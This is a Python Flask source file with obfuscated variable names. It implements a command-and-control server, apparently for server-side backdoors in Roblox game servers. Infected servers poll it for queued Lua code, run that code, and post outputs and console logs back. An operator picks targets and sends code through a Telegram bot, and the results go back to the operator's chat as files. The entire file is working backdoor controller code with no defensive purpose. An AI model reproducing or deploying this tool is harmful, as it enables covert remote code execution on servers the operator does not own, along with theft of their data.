# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import threading, time, requests, os, io, json

_k1 = os.environ.get("kek", "")
_k2 = int(os.environ.get("pep", "0"))
_k3 = os.environ.get("beb", "")

if not _k1 or not _k2 or not _k3:
    raise SystemExit("config missing")

_a1 = Flask(__name__)
_a2 = []
_a3 = []
_a4 = threading.Lock()
_a5 = {}
_a7 = []
_a8 = threading.Lock()
_a9 = {"live": False, "last_sent": 0, "interval": 30}
_b1 = {"target": "all", "place": None, "job": None}

def _cleanup():
    while True:
        time.sleep(30)
        _now = time.time()
        with _a4:
            for _p in list(_a5.keys()):
                for _j in list(_a5[_p].keys()):
                    if _now - _a5[_p][_j]["t"] > 90:
                        del _a5[_p][_j]
                if not _a5[_p]:
                    del _a5[_p]

threading.Thread(target=_cleanup, daemon=True).start()

@_a1.route("/health")
def _h0():
    return "ok"

@_a1.route("/")
def _h1():
    return "alive"

@_a1.route("/poll")
def _h2():
    if request.args.get("token") != _k3:
        return jsonify({"error": "no"}), 403
    _pid = request.args.get("place", "0")
    _jid = request.args.get("job", "")
    _pl = request.args.get("players", "0")
    try: _pid_i = int(_pid)
    except: _pid_i = 0
    try: _pl_i = int(_pl)
    except: _pl_i = 0
    with _a4:
        if _pid_i not in _a5:
            _a5[_pid_i] = {}
        _a5[_pid_i][_jid] = {"t": time.time(), "players": _pl_i}
        _out = []
        _rest = []
        for _c in _a2:
            _t = _c.get("target", "all")
            if _t == "all":
                _out.append(_c)
            elif _t == "place" and str(_c.get("place")) == str(_pid_i):
                _out.append(_c)
            elif _t == "job" and _c.get("job") == _jid:
                _out.append(_c)
            else:
                _rest.append(_c)
        _a2[:] = _rest
    return jsonify(_out)

@_a1.route("/result", methods=["POST"])
def _h3():
    if request.headers.get("X-Token") != _k3:
        return jsonify({"error": "no"}), 403
    _d = request.json or {}
    with _a4:
        _a3.append({
            "place": _d.get("place", 0),
            "job": _d.get("job", "?"),
            "cmd": _d.get("cmd"),
            "out": _d.get("out", "")[:100000]
        })
    return jsonify({"ok": True})

@_a1.route("/console", methods=["POST"])
def _h4():
    if request.headers.get("X-Token") != _k3:
        return jsonify({"error": "no"}), 403
    _d = request.json or {}
    with _a8:
        _a7.append({
            "place": _d.get("place", 0),
            "job": _d.get("job", "?"),
            "line": _d.get("line", ""),
            "kind": _d.get("kind", "log"),
            "ts": time.time()
        })
        if len(_a7) > 1000:
            _a7.pop(0)
    return jsonify({"ok": True})

def _s1(_t, _kb=None):
    _data = {"chat_id": _k2, "text": _t[:4000]}
    if _kb:
        _data["reply_markup"] = json.dumps(_kb)
    try:
        requests.post("https://api.telegram.org/bot" + _k1 + "/sendMessage",
                      data=_data, timeout=10)
    except Exception as _e:
        print("err:", _e)

def _s2(_n, _c):
    try:
        requests.post("https://api.telegram.org/bot" + _k1 + "/sendDocument",
                      data={"chat_id": _k2, "caption": _n},
                      files={"document": (_n, io.BytesIO(_c.encode("utf-8")), "text/plain")},
                      timeout=30)
    except Exception as _e:
        print("err:", _e)

def _console_pusher():
    while True:
        time.sleep(5)
        if not _a9.get("live", False):
            continue
        _now = time.time()
        _iv = _a9.get("interval", 30)
        if _now - _a9.get("last_sent", 0) < _iv:
            continue
        _a9["last_sent"] = _now
        with _a8:
            if not _a7:
                continue
            _txt = "\n".join(f"[{x['place']}/{x['job']}] [{x['kind']}] {x['line']}" for x in _a7[-1000:])
            _a7.clear()
        _s2(f"console_{int(_now)}.txt", _txt)

def _games_text():
    with _a4:
        if not _a5:
            return "no active servers", None
        _btns = []
        _i = 0
        for _p, _js in _a5.items():
            _total = sum(j["players"] for j in _js.values())
            _btns.append([{
                "text": f"{_p}   {len(_js)} srv   {_total}p",
                "callback_data": f"use:{_p}:all"
            }])
            for _j, _info in _js.items():
                _btns.append([{
                    "text": f"   {_j[:12]}   {_info['players']}p",
                    "callback_data": f"use:{_p}:{_j}"
                }])
                _i += 1
                if _i >= 25: break
            if _i >= 25: break
        return "select server:", {"inline_keyboard": _btns}

def _p1():
    _l = None
    while True:
        try:
            _r = requests.get("https://api.telegram.org/bot" + _k1 + "/getUpdates",
                              params={"timeout": 25, "offset": _l + 1 if _l else -1},
                              timeout=35).json()
            if not _r.get("ok"):
                time.sleep(3); continue
            for _u in _r.get("result", []):
                _l = _u.get("update_id")

                _cb = _u.get("callback_query")
                if _cb:
                    _cdata = _cb.get("data", "")
                    _cid = _cb["message"]["chat"]["id"]
                    if _cid == _k2 and _cdata.startswith("use:"):
                        _, _p, _j = _cdata.split(":", 2)
                        if _j == "all":
                            _b1["target"] = "place"
                            _b1["place"] = _p
                            _b1["job"] = None
                            _s1(f"target: place {_p}")
                        else:
                            _b1["target"] = "job"
                            _b1["place"] = _p
                            _b1["job"] = _j
                            _s1(f"target: {_p}/{_j[:12]}")
                    try:
                        requests.post("https://api.telegram.org/bot" + _k1 + "/answerCallbackQuery",
                                      data={"callback_query_id": _cb["id"]})
                    except: pass
                    continue

                _m = _u.get("message") or {}
                _c = (_m.get("chat") or {}).get("id")
                _x = (_m.get("text") or "").strip()
                if _c != _k2 or not _x: continue

                if _x == "/start":
                    _s1("SS control\n\n"
                        "/games              active servers\n"
                        "/use <place> [job]  select target\n"
                        "/current            current target\n"
                        "/reset              target = all\n"
                        "/console            console (txt)\n"
                        "/console_live [s]   auto console\n"
                        "/console_stop       stop auto\n"
                        "/clear              clear buffer\n"
                        "/last               last results\n\n"
                        "plain text -> current target"); continue

                if _x == "/games":
                    _t, _kb = _games_text()
                    _s1(_t, _kb)
                    continue

                if _x == "/current":
                    _s1(f"target: {_b1['target']}\nplace: {_b1['place']}\njob: {_b1['job']}")
                    continue

                if _x == "/reset":
                    _b1["target"] = "all"; _b1["place"] = None; _b1["job"] = None
                    _s1("target = all"); continue

                if _x.startswith("/use "):
                    _p = _x[5:].split()
                    if len(_p) == 1:
                        _b1["target"] = "place"; _b1["place"] = _p[0]; _b1["job"] = None
                        _s1(f"target: place {_p[0]}")
                    elif len(_p) >= 2:
                        _b1["target"] = "job"; _b1["place"] = _p[0]; _b1["job"] = _p[1]
                        _s1(f"target: {_p[0]}/{_p[1][:12]}")
                    continue

                if _x == "/console":
                    with _a8:
                        if not _a7:
                            _s1("empty"); continue
                        _txt = "\n".join(f"[{x['place']}/{x['job']}] [{x['kind']}] {x['line']}" for x in _a7[-1000:])
                        _a7.clear()
                    _s2("console.txt", _txt)
                    continue

                if _x.startswith("/console_live"):
                    _p = _x.split()
                    try:
                        _a9["interval"] = max(5, int(_p[1])) if len(_p) > 1 else 30
                    except:
                        _a9["interval"] = 30
                    _a9["live"] = True
                    _a9["last_sent"] = 0
                    _s1(f"console live: {_a9['interval']}s")
                    continue

                if _x == "/console_stop":
                    _a9["live"] = False
                    _s1("console live: off"); continue

                if _x == "/clear":
                    with _a8:
                        _a7.clear()
                    _s1("cleared"); continue

                if _x == "/last":
                    with _a4:
                        _z = _a3[-10:]
                    if not _z:
                        _s1("empty"); continue
                    _txt = "\n\n".join(f"[{x['place']}/{x['job']}] $ {x['cmd']}\n{x['out']}" for x in _z)
                    _s2("last.txt", _txt)
                    continue

                if _x.startswith("all "):
                    _code = _x[4:]
                    with _a4:
                        _a2.append({"cmd": _code, "target": "all", "ts": time.time()})
                    _s1("queued: all")
                    continue

                if _x.startswith("game "):
                    _p = _x[5:].split(" ", 1)
                    if len(_p) < 2:
                        _s1("game <placeId> <lua>"); continue
                    with _a4:
                        _a2.append({"cmd": _p[1], "target": "place", "place": _p[0], "ts": time.time()})
                    _s1(f"queued: {_p[0]}")
                    continue

                if _x.startswith("job "):
                    _p = _x[4:].split(" ", 1)
                    if len(_p) < 2:
                        _s1("job <jobId> <lua>"); continue
                    with _a4:
                        _a2.append({"cmd": _p[1], "target": "job", "job": _p[0], "ts": time.time()})
                    _s1(f"queued: {_p[0][:12]}")
                    continue

                _t = _b1["target"]
                if _t == "all":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "all", "ts": time.time()})
                    _s1("queued: all")
                elif _t == "place":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "place", "place": _b1["place"], "ts": time.time()})
                    _s1(f"queued: {_b1['place']}")
                elif _t == "job":
                    with _a4:
                        _a2.append({"cmd": _x, "target": "job", "job": _b1["job"], "ts": time.time()})
                    _s1(f"queued: {_b1['job'][:12]}")
        except Exception as _e:
            print("err:", _e)
            time.sleep(3)

def _p2():
    while True:
        time.sleep(2)
        with _a4:
            if not _a3:
                continue
            _b = _a3[:]
            _a3.clear()
        for _x in _b:
            _c = _x.get("cmd") or ""
            _o = (_x.get("out") or "").strip()
            _tag = f"[{_x['place']}/{_x['job'][:8]}]"
            if _o.startswith("compile err:") or _o.startswith("runtime err:"):
                _s1(f"{_tag} error\n{_o}")
            else:
                if not _o or _o == "nil":
                    _s1(f"{_tag} ok")
                else:
                    _s2("result.txt", f"{_tag} $ {_c}\n\n{_o}")

threading.Thread(target=_p1, daemon=True).start()
threading.Thread(target=_p2, daemon=True).start()
threading.Thread(target=_console_pusher, daemon=True).start()

if __name__ == "__main__":
    _prt = int(os.environ.get("PORT", 8080))
    print("[+] started", _prt)
    _a1.run(host="0.0.0.0", port=_prt, debug=False)
